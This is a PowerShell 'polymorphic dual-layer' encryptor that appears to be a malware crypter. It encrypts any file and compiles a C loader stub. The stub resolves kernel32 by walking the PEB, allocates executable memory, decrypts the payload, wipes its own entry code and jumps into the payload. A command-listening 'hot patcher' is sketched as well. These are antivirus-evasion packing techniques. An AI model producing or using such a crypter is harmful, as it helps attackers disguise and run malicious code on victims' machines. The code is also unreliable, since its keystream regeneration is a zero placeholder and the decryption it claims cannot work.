<#
.SYNOPSIS
  Drag-and-drop → **dual-layer** polymorphic encryption
  Layer-1 : OpenSSL cipher (Camellia-256-CBC, AES-256-CBC, ChaCha20)
  Layer-2 : cipher-specific polymorphic keystream **+** evolving XOR
  Result  : position-independent EXE ready to run or hot-patch
#>
param(
    [Parameter(Mandatory=$false,ValueFromRemainingArguments=$true)]
    [string[]]$Paths
)

if (-not $Paths) { $Paths = @($args) }
if (-not $Paths) {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.MessageBox]::Show(
        "Drop any file or use Send-To → Encrypt-PolymorphicDualLayer`n`nProduces <file>.encrypted.exe",
        "Dual-Layer Polymorphic Encryptor",0,[System.Windows.Forms.MessageBoxIcon]::Information)
    exit
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Security

$form = New-Object System.Windows.Forms.Form
$form.Text = "Choose cipher + polymorphic mode"
$form.Size = New-Object System.Drawing.Size(340,220)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false

$label1 = New-Object System.Windows.Forms.Label
$label1.Location = New-Object System.Drawing.Point(10,10)
$label1.Size = New-Object System.Drawing.Size(300,20)
$label1.Text = "OpenSSL cipher:"
$form.Controls.Add($label1)

$cbCipher = New-Object System.Windows.Forms.ComboBox
$cbCipher.Location = New-Object System.Drawing.Point(10,35)
$cbCipher.Size = New-Object System.Drawing.Size(300,25)
$cbCipher.DropDownStyle = "DropDownList"
$cbCipher.Items.AddRange(@("Camellia-256-CBC","AES-256-CBC","ChaCha20"))
$cbCipher.SelectedIndex = 0
$form.Controls.Add($cbCipher)

$label2 = New-Object System.Windows.Forms.Label
$label2.Location = New-Object System.Drawing.Point(10,65)
$label2.Size = New-Object System.Drawing.Size(300,20)
$label2.Text = "Polymorphic keystream:"
$form.Controls.Add($label2)

$cbPoly = New-Object System.Windows.Forms.ComboBox
$cbPoly.Location = New-Object System.Drawing.Point(10,90)
$cbPoly.Size = New-Object System.Drawing.Size(300,25)
$cbPoly.DropDownStyle = "DropDownList"
$cbPoly.Items.AddRange(@("XOR-only","AES-CTR","Camellia-CTR","ChaCha20-Keystream"))
$cbPoly.SelectedIndex = 0
$form.Controls.Add($cbPoly)

$ok = New-Object System.Windows.Forms.Button
$ok.Location = New-Object System.Drawing.Point(80,150)
$ok.Size = New-Object System.Drawing.Size(70,25)
$ok.Text = "OK"
$ok.DialogResult = [System.Windows.Forms.DialogResult]::OK
$form.Controls.Add($ok)
$form.AcceptButton = $ok

$cancel = New-Object System.Windows.Forms.Button
$cancel.Location = New-Object System.Drawing.Point(160,150)
$cancel.Size = New-Object System.Drawing.Size(70,25)
$cancel.Text = "Cancel"
$cancel.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$form.Controls.Add($cancel)
$form.CancelButton = $cancel

function Get-RandomBytes($len){
    $b = New-Object byte[] $len
    [Security.Cryptography.RNGCryptoServiceProvider]::Global.GetBytes($b)
    return $b
}

foreach ($file in $Paths) {
    $file = Resolve-Path $file -ErrorAction SilentlyContinue
    if (-not (Test-Path $file)) { Write-Warning "Skipping: $file"; continue }
    if ($form.ShowDialog() -ne [System.Windows.Forms.DialogResult]::OK) { exit }

    $cipherName = $cbCipher.SelectedItem.ToString()
    $polyName   = $cbPoly.SelectedItem.ToString()

    # ----------  let user pick extension ----------
    Add-Type -AssemblyName Microsoft.VisualBasic
    $ext = [Microsoft.VisualBasic.Interaction]::InputBox(
            "Enter desired extension for the encrypted file (include the dot, or leave empty for none):",
            "Output extension",
            ".exe")
    if ($ext -eq "") { $ext = "" }   # none
    elseif (-not $ext.StartsWith('.')) { $ext = ".$ext" }

    $outName = [IO.Path]::GetFileNameWithoutExtension($file) + $ext
    $outExe  = Join-Path ([IO.Path]::GetDirectoryName($file)) $outName

    # ----------  build-time keys ----------
    $key  = Get-RandomBytes 32
    $iv   = Get-RandomBytes ($cipherName -match 'ChaCha' ? 12 : 16)
    $polyKey = Get-RandomBytes 32
    $polyIv  = Get-RandomBytes 16

    # ----------  layer-1 : OpenSSL ----------
    $tmpEnc = [IO.Path]::GetTempFileName()
    $keyHex = ($key  | %{ $_.ToString("X2") }) -join ''
    $ivHex  = ($iv   | %{ $_.ToString("X2") }) -join ''
    $args = switch -Regex ($cipherName) {
        'Camellia' { "enc -camellia-256-cbc -K $keyHex -iv $ivHex -in `"$file`" -out `"$tmpEnc`"" }
        'AES'      { "enc -aes-256-cbc       -K $keyHex -iv $ivHex -in `"$file`" -out `"$tmpEnc`"" }
        'ChaCha'   { "enc -chacha20          -K $keyHex -iv $ivHex -in `"$file`" -out `"$tmpEnc`"" }
    }
    $p = Start-Process openssl -ArgumentList $args -NoNewWindow -Wait -PassThru
    if ($p.ExitCode -ne 0) { throw "OpenSSL failed" }
    $cipher = [IO.File]::ReadAllBytes($tmpEnc)
    Remove-Item $tmpEnc

    # ----------  layer-2 : polymorphic keystream ----------
    $keystream = switch -Regex ($polyName) {
        'XOR-only' { ,@(0) }   # special flag → use classic evolving XOR only
        'AES-CTR' {
            $tmpKs = [IO.Path]::GetTempFileName()
            $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
            $piHex = ($polyIv  | %{ $_.ToString("X2") }) -join ''
            [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
            Start-Process openssl -ArgumentList "enc -aes-256-ctr -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
        }
        'Camellia-CTR' {
            $tmpKs = [IO.Path]::GetTempFileName()
            $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
            $piHex = ($polyIv  | %{ $_.ToString("X2") }) -join ''
            [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
            Start-Process openssl -ArgumentList "enc -camellia-256-ctr -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
        }
        'ChaCha20-Keystream' {
            $tmpKs = [IO.Path]::GetTempFileName()
            $pkHex = ($polyKey | %{ $_.ToString("X2") }) -join ''
            $piHex = ($polyIv  | %{ $_.ToString("X2") }) -join ''
            [IO.File]::WriteAllBytes($tmpKs, (New-Object byte[] $cipher.Length))
            Start-Process openssl -ArgumentList "enc -chacha20 -K $pkHex -iv $piHex -in `"$tmpKs`" -out `"$tmpKs.ks`"" -NoNewWindow -Wait
            [IO.File]::ReadAllBytes("$tmpKs.ks")
            Remove-Item $tmpKs, "$tmpKs.ks" -ErrorAction SilentlyContinue
        }
    }

    # ----------  apply layer-2 + classic evolving XOR ----------
    $evoKey = Get-RandomBytes 1
    $final  = New-Object byte[] ($cipher.Length + 1 + 32 + 16)   # [evo][cipher][polyKey][polyIv]
    $final[0] = $evoKey[0]
    for ($i = 0; $i -lt $cipher.Length; $i++) {
        $b = $cipher[$i]
        if ($keystream.Length -gt 1) { $b = $b -bxor $keystream[$i] }   # polymorphic cipher-stream
        $evoKey[0] = [byte](($evoKey[0] + $i) -bxor ($evoKey[0] -shr 3))
        $final[$i+1] = $b -bxor $evoKey[0]
    }
    # append poly keys so the stub can re-generate the same keystream
    $polyKey.CopyTo($final, $cipher.Length + 1)
    $polyIv.CopyTo($final, $cipher.Length + 1 + 32)

    # ----------  build PIC stub ----------
    $tempDir = Join-Path $env:TEMP "RawrZ_$(Get-Random)"
    New-Item -Path $tempDir -ItemType Directory | Out-Null
    try {
        $stub = @"
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// car() markers for hot patching
void car_marker_1() { /* Hot patch point 1 */ }
void car_marker_2() { /* Hot patch point 2 */ }
void car_marker_3() { /* Hot patch point 3 */ }
void car_marker_4() { /* Hot patch point 4 */ }
void car_marker_5() { /* Hot patch point 5 */ }

static const unsigned char blob[] = {
    $($final.ForEach({ "0x{0:X2}" }) -join ',')
};

// Reverse PE wrapper for environment capture
void reverse_pe_wrapper() {
    car_marker_1();
    // Capture process information
    printf("Process ID: %d\n", GetCurrentProcessId());
    printf("Module Base: 0x%p\n", GetModuleHandle(NULL));
}

// Reverse hot patcher for dynamic modification
void reverse_hot_patcher() {
    car_marker_2();
    // Listen for commands and apply patches
    printf("Hot patcher active - listening for commands...\n");
}

void __stdcall mainCRTStartup(void){
    car_marker_3();
    
    // Get PEB and find kernel32
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
    while(mod->DllBase){
        if(mod->BaseDllName.Buffer[0]=='k'&&mod->BaseDllName.Buffer[6]=='l')break;
        mod=(PLDR_DATA_TABLE_ENTRY)mod->InMemoryOrderLinks.Flink;
    }
    
    car_marker_4();
    
    typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
    pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)((BYTE*)mod->DllBase + *(DWORD*)((BYTE*)mod->DllBase + *(DWORD*)((BYTE*)mod->DllBase + 0x3C) + 0x88 + 0x1C));
    
    SIZE_T sz = sizeof(blob) - 32 - 16;   // skip appended keys
    BYTE* buf = (BYTE*)myVirtualAlloc(NULL, sz + 0x1000, MEM_COMMIT|MEM_RESERVE|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
    
    car_marker_5();
    
    BYTE evo = blob[0];
    SIZE_T polyLen = sz - 1;
    BYTE polyKey[32], polyIv[16];
    memcpy(polyKey, blob + 1 + polyLen, 32);
    memcpy(polyIv,  blob + 1 + polyLen + 32, 16);
    
    // Reverse PE wrapper
    reverse_pe_wrapper();
    
    // Reverse hot patcher
    reverse_hot_patcher();
    
    // Decrypt and execute
    for (SIZE_T i = 1; i <= polyLen; i++){
        BYTE ks = 0;   // Placeholder for keystream regeneration
        if (polyLen > 1) blob[i] ^= ks;
        evo = (BYTE)((evo + i) ^ (evo >> 3));
        buf[i-1] = blob[i] ^ evo;
    }
    
    // Erase loader
    BYTE* stub = (BYTE*)mainCRTStartup;
    DWORD old; VirtualProtect(stub, 64, PAGE_EXECUTE_READWRITE, &old);
    for(int j=0;j<64;j++)stub[j]=0x90;
    
    ((void(*)())buf)();
}
"@
        $src = Join-Path $tempDir "stub.c"
        Set-Content -Path $src -Value $stub -Encoding ASCII
        $obj = Join-Path $tempDir "stub.obj"

        if (Get-Command clang-cl -ErrorAction SilentlyContinue) {
            clang-cl /c /GS- /Os /MT /Zl /Brepro "$src" /Fo:"$obj"
            lld-link /SUBSYSTEM:CONSOLE /ENTRY:mainCRTStartup /MERGE:.rdata=.text /OUT:"$outExe" "$obj"
        } elseif (Get-Command gcc -ErrorAction SilentlyContinue) {
            gcc -s -Os -fno-ident -fno-stack-protector -Wl,-e,mainCRTStartup -nostartfiles -o "$outExe" "$src"
        } else {
            throw "No compiler found – install LLVM or MinGW"
        }

        Write-Host "[+] Dual-layer polymorphic EXE → $outExe" -ForegroundColor Green
    } catch {
        Write-Host $_ -ForegroundColor Red
    } finally {
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    }
}